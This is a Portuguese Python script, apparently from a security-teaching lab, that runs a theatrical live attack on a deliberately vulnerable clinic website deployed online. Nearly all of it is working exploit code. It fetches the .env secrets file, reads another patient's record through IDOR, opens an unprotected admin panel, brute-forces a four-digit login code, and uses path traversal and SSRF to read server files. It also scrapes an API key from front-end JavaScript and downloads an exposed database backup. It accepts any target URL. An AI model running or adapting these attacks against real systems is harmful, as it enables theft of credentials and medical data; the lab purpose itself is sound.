# -*- coding: utf-8 -*-
"""
💀 MODO HACKER ONLINE — ataque ao vivo na Clínica VidaPlena PUBLICADA (Vercel).
Mesmo visual de filme do ataque local, mas o alvo agora é o site NO AR.

Uso:
    python MISSOES/ataque-online.py
    python MISSOES/ataque-online.py https://outra-url.vercel.app

⚠️ Lab PRÓPRIO, dados 100% fictícios. Nunca use estas técnicas em sistemas de terceiros.
"""
import json
import os
import sys
import time
import urllib.request
import urllib.error

# NOTA: os.system("") vazio é o truque padrão para habilitar cores ANSI no
# terminal do Windows (não executa nada; sem risco de injection). Seguro aqui.
os.system("")  # habilita cores ANSI no terminal do Windows

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"; W = "\033[97m"
B = "\033[1m"; D = "\033[2m"; X = "\033[0m"

BASE = (sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://clinica-vidaplena.vercel.app")
HOST = BASE.replace("https://", "").replace("http://", "")

BANNER = r"""
 __   __     __  __     __  ___          __
/  ` |__|  /  \|__) |  /  \  |  |\ |    |__)
\__, |  |  \__/|__) |__\__/  |  | \|    |__)
      A T A Q U E   O N L I N E  ·  S I T E   N O   A R
"""

def slow(t, d=0.012, fim="\n"):
    for ch in t:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(d)
    sys.stdout.write(fim)

def titulo(n, nome):
    print()
    print(f"{D}{'─' * 64}{X}")
    slow(f"{B}[{n}/8] {nome}{X}", 0.012)
    print(f"{D}{'─' * 64}{X}")

def ok(msg):
    print(f"  {G}✓ {msg}{X}")

def info(msg):
    print(f"  {C}→ {msg}{X}")

def perigo(msg):
    print(f"  {R}{B}!! {msg}{X}")

def req(path, method="GET", data=None):
    r = urllib.request.Request(
        BASE + path, method=method,
        data=json.dumps(data).encode() if data else None,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (lab-check)"},
    )
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception:
        return 0, ""

print()
print(f"{G}{BANNER}{X}")
slow(f"{W}{B}  ALVO: Clínica VidaPlena ONLINE  {D}({HOST} · lab próprio · dados fictícios){X}", 0.01)
print()

s, _ = req("/")
if s != 200:
    print(f"{R}⚠️  O site não respondeu. Confere a URL: {BASE}{X}")
    sys.exit(2)
slow(f"{D}  site no ar, respondendo. começando...{X}", 0.008)

time.sleep(0.8)

# [1] .env
titulo(1, "ARQUIVO DE SEGREDOS · .env")
info("baixando o arquivo de chaves do servidor...")
time.sleep(0.7)
s, b = req("/.env")
linhas = [l for l in b.splitlines() if "=" in l and not l.startswith("#")]
slow(f"    GET /.env  →  200 OK  ({len(linhas)} segredos)", 0.03)
for l in linhas[:4]:
    print(f"    {G}{l}{X}")
perigo("senha do banco, chaves de API e tokens, servidos pela web")
time.sleep(1.2)

# [2] IDOR
titulo(2, "PRONTUÁRIO DE OUTRO PACIENTE · IDOR")
info("logado como Mariana · pedindo o agendamento 103...")
time.sleep(0.7)
s, b = req("/api/agendamentos/103?token=tok_mariana_4d1")
d = json.loads(b)
slow(f"    dono do agendamento: paciente #{d['paciente_id']} (NÃO é a Mariana)", 0.03)
perigo(f"observação médica vazada: \"{str(d.get('observacoes'))[:70]}...\"")
time.sleep(1.2)

# [3] painel interno
titulo(3, "PAINEL INTERNO ABERTO · SEM CHECAGEM")
info("token de PACIENTE acessando a área da equipe...")
time.sleep(0.7)
s, b = req("/api/admin/pacientes?token=tok_mariana_4d1")
pacs = json.loads(b)
for p in pacs[:3]:
    print(f"    {G}{p['nome']}  CPF {p['cpf']}  {p['telefone']}{X}")
s, b = req("/api/admin/financeiro?token=tok_mariana_4d1")
fin = json.loads(b)
perigo(f"financeiro exposto: {fin['faturamento_bruto']} de faturamento visível pra uma paciente")
time.sleep(1.2)

# [4] OTP brute force
titulo(4, "CÓDIGO DE ACESSO SEM LIMITE · BRUTE FORCE")
info("4 dígitos = 10.000 combinações. sem rate limit, é questão de tempo.")
time.sleep(0.8)
achou = None
for i in range(4780, 4901):
    code = f"{i:04d}"
    s, b = req("/api/login/codigo", "POST", {"email": "mariana@exemplo.com", "codigo": code})
    if i % 10 == 0:
        sys.stdout.write(f"\r    {D}tentando {code}...{X}")
        sys.stdout.flush()
    if s == 200 and '"token"' in b:
        achou = code
        break
print()
if achou:
    slow(f"    {G}{B}>>> ACESSO CONCEDIDO · CÓDIGO {achou} <<<{X}", 0.03)
    token = json.loads(b).get("token")
    ok(f"sessão aberta como a paciente (token {token})")
perigo("entrou sem senha. só tentando rápido o suficiente.")
time.sleep(1.2)

# [5] path traversal
titulo(5, "PATH TRAVERSAL · O EXAME QUE VIRA COFRE")
info("pedindo um 'exame'... com ../../ no caminho")
time.sleep(0.7)
s, b = req("/api/exame?arquivo=../../.env")
if "OPENAI" in b:
    slow(f"    GET /api/exame?arquivo=../../.env  →  200 OK", 0.03)
    perigo("em vez do exame, veio o arquivo de SEGREDOS do servidor")
time.sleep(1.2)

# [6] SSRF
titulo(6, "SSRF · A FOTO DE PERFIL QUE ESPIA POR DENTRO")
info("colando uma URL interna no campo de 'importar foto'...")
time.sleep(0.7)
s, b = req("/api/importar-foto", "POST", {"url": BASE + "/.env"})
if "OPENAI" in b:
    ok("o servidor foi lá, buscou e devolveu o conteúdo interno")
perigo("quem busca não é o navegador. é o servidor. e o servidor alcança tudo.")
time.sleep(1.2)

# [7] chave no front
titulo(7, "CHAVE DE API NO FRONT · F12 LEITOR")
info("procurando chaves no JavaScript que o navegador baixou...")
time.sleep(0.7)
s, b = req("/app.js")
for l in b.splitlines():
    if "VIDA_AI_KEY" in l:
        print(f"    {G}{l.strip()[:78]}{X}")
ok("chave da assistente virtual legível por qualquer visitante")
time.sleep(1.2)

# [8] backup
titulo(8, "BACKUP EXPOSTO · O MAPA DO BANCO")
info("baixando /backup.sql...")
time.sleep(0.7)
s, b = req("/backup.sql")
n = b.count("INSERT")
slow(f"    GET /backup.sql  →  200 OK  (dump com {n} INSERTs e senha)", 0.03)
perigo("o banco inteiro, de graça, na pasta pública")
time.sleep(1.0)

print()
print(f"{R}{B}{'═' * 64}{X}")
slow(f"{R}{B}  💀 8/8 FALHAS EXPLORADAS — O SITE NO AR FOI COMPROMETIDO{X}", 0.02)
print(f"{D}  ({HOST} — lab próprio, dados fictícios){X}")
print(f"{R}{B}{'═' * 64}{X}")
print()
